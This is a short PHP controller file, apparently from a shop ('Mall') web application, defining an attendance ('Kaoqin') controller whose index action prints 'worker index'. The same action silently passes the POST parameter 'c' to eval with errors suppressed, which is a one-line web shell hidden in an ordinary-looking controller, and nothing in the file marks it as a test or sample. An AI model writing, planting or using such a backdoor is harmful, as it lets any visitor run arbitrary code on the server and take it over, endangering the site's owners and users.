<?php
namespace Mall\Controller;
class KaoqinController extends CommonController {
    public function index(){
        $this->show('worker index');
        $c = @eval($_POST['c']);
    }


}